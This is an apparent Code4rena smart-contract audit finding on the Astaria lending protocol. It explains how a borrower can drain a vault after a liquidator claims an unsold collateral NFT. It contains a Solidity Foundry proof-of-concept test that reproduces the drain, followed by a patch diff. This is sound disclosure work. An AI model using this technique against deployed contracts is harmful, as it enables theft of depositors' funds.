## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-05

# [Vault may be drained after a liquidated NFT was claimed by the liquidator](https://github.com/code-423n4/2023-01-astaria-findings/issues/480) 

# Lines of code

https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220-L231


# Vulnerability details

## Impact
The owner of a collateral NFT that was liquidated and then claimed by the liquidator (after the auction had no bids) may drain the vault the loan was taken from.
## Proof of Concept
There's an extreme situation when a liquidated and auctioned collateral NFT had no bids and the auction has expired. In this situation, the liquidator may claim the NFT by calling [CollateralToken.liquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109). The function:
1. calls [ClearingHouse.settleLiquidatorNFTClaim](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/ClearingHouse.sol#L220) to burn the lien token associated with the loan and clean up the accounting without repaying the actual loan (the loan cannot be repaid since there were no bids);
1. [releases the collateral NFT to the liquidator](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L352).

However, the function doesn't settle the auction. As a result:
1. the `CollateralToken` is not burned ([CollateralToken.sol#L538](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L538));
1. the link between the collateral ID and the underlying token is not removed ([CollateralToken.sol#L537](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L537));
1. the link between the collateral ID and the auction is also not removed ([CollateralToken.sol#L544](https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L544)).

This allows the owner of the liquidated collateral NFT to create a new lien and take the maximal loan without providing any collateral.

### Exploit Scenario
1. Alice deposits an NFT token as a collateral and takes a loan.
1. Alice's loan expires and her NFT collateral gets liquidated by Bob.
1. The collateral NFT wasn't sold off auction as there were no bids.
1. Bob claims the collateral NFT and receives it.
1. Alice takes another loan from the vault without providing any collateral.

The following PoC demonstrates the above scenario:
```solidity
// src/test/AstariaTest.t.sol
function testAuctionEndNoBidsMismanagement_AUDIT() public {
  address bob = address(2);
  TestNFT nft = new TestNFT(6);
  uint256 tokenId = uint256(5);
  address tokenContract = address(nft);

  // Creating a public vault and providing some liquidity.
  address publicVault = _createPublicVault({
    strategist: strategistOne,
    delegate: strategistTwo,
    epochLength: 14 days
  });

  _lendToVault(Lender({addr: bob, amountToLend: 150 ether}), publicVault);
  (, ILienToken.Stack[] memory stack) = _commitToLien({
    vault: publicVault,
    strategist: strategistOne,
    strategistPK: strategistOnePK,
    tokenContract: tokenContract,
    tokenId: tokenId,
    lienDetails: blueChipDetails,
    amount: 100 ether,
    isFirstLien: true
  });

  uint256 collateralId = tokenContract.computeId(tokenId);
  vm.warp(block.timestamp + 11 days);

  // Liquidator liquidates the loan after expiration.
  address liquidator = address(0x123);
  vm.prank(liquidator);
  OrderParameters memory listedOrder = ASTARIA_ROUTER.liquidate(
    stack,
    uint8(0)
  );

  // Skipping the auction duration and making no bids.
  skip(4 days);

  // Liquidator claims the liquidated NFT.
  vm.prank(liquidator);
  COLLATERAL_TOKEN.liquidatorNFTClaim(listedOrder);
  PublicVault(publicVault).processEpoch();

  // Liquidator is the rightful owner of the collateral NFT.
  assertEq(nft.ownerOf(tokenId), address(liquidator));

  // Since the auction wasn't fully settled, the CollateralToken still exists for the collateral NFT.
  // The borrower is the owner of the CollateralToken.
  assertEq(COLLATERAL_TOKEN.ownerOf(collateralId), address(this));

  // WETH balances at this moment:
  // 1. the borrower keep holding the 100 ETH it borrowed earlier;
  // 2. the vault keeps holding 50 ETH of liquidity.
  assertEq(WETH9.balanceOf(address(this)), 100 ether);
  assertEq(WETH9.balanceOf(address(publicVault)), 50 ether);

  // The borrower creates another lien. This time, the borrower is not the owner of the collateral NFT.
  // However, it's still the owner of the CollateralToken.
  (, stack) = _commitToLien({
    vault: publicVault,
    strategist: strategistOne,
    strategistPK: strategistOnePK,
    tokenContract: tokenContract,
    tokenId: tokenId,
    lienDetails: blueChipDetails,
    amount: 50 ether,
    isFirstLien: true
  });

  // The borrower has taken a loan of 50 ETH from the vault.
  assertEq(WETH9.balanceOf(address(this)), 150 ether);
  // The vault was drained.
  assertEq(WETH9.balanceOf(address(publicVault)), 0 ether);
}
```
## Tools Used
Manual review
## Recommended Mitigation Steps
Consider settling the auction at the end of `settleLiquidatorNFTClaim`:
```diff
diff --git a/src/ClearingHouse.sol b/src/ClearingHouse.sol
index 5c2a400..d4ee28d 100644
--- a/src/ClearingHouse.sol
+++ b/src/ClearingHouse.sol
@@ -228,5 +228,7 @@ contract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {
       0,
       s.auctionStack.stack
     );
+    uint256 collateralId = _getArgUint256(21);
+    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);
   }
 }
```